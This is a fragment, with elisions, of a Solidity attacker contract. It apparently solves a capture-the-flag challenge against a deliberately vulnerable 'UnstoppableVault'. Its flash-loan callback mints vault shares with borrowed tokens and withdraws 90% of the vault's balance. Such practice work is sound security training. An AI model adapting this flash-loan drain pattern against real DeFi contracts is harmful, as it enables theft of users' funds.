...
contract ReceiverAttacker is Owned, IERC3156FlashBorrower {
  UnstoppableVault private immutable pool;
  ...
  function onFlashLoan(
    ...
    ERC20(token).approve(address(msg.sender), amount * 2);

    pool.mint(amount, address(this));

    pool.withdraw(
      (ERC20(pool).balanceOf(address(this)) * 90) / 100,
      address(this),
      address(this)
    );

    // console.log('Im here %s', ERC20(token).balanceOf(address(this)));
    // console.log('Im here %s', ERC20(pool).balanceOf(address(this)));
